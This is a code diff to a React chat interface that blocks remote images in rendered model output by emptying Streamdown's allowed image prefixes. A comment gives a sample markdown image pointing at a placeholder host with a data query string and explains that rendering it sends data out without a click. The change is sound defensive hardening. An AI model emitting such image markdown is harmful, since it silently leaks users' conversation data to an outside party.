@@ -9,8 +9,10 @@ import type { LhViewMessage } from "@/src/core";
 import { memo } from "react";
 import remarkBreaks from "remark-breaks";
 import {
+  defaultRehypePlugins,
   Streamdown,
   type PluginConfig,
+  type StreamdownProps,
 } from "streamdown";
 import { mdComponents } from "@/components/md-blocks";
 import { memoizeRehypeKatex } from "@/components/katex-cache";
@@ -100,6 +102,19 @@ export const streamdownPlugins = {
   math: { ...math, rehypePlugin: [memoizeRehypeKatex(rehypeKatex), katexOptions] },
 } as unknown as PluginConfig;
 
+// Model output must not load remote images: a rendered
+// ![x](https://host/?d=...) sends data out with no click. Streamdown's
+// default harden step allows every image prefix, so this keeps its
+// raw → sanitize → harden pipeline and changes one option. A blocked image
+// becomes an "[Image blocked: alt]" badge. data: images were already
+// blocked by the sanitize step; the app's image and SVG cards don't render
+// through markdown. Links are unchanged.
+const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [unknown, Record<string, unknown>];
+export const streamdownRehypePlugins = Object.values({
+  ...defaultRehypePlugins,
+  harden: [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [] }],
+}) as NonNullable<StreamdownProps["rehypePlugins"]>;
+
 export const MessageResponse = memo(
   ({ className, children, streaming = false, ...props }: MessageResponseProps) => {
     // Legacy backslash delimiters are converted in a single linear scan;
@@ -120,6 +135,7 @@ export const MessageResponse = memo(
         )}
         components={mdComponents}
         plugins={streamdownPlugins}
+        rehypePlugins={streamdownRehypePlugins}
         remend={streamdownRemend}
         parseIncompleteMarkdown={streaming}
         BlockComponent={CachedBlock}
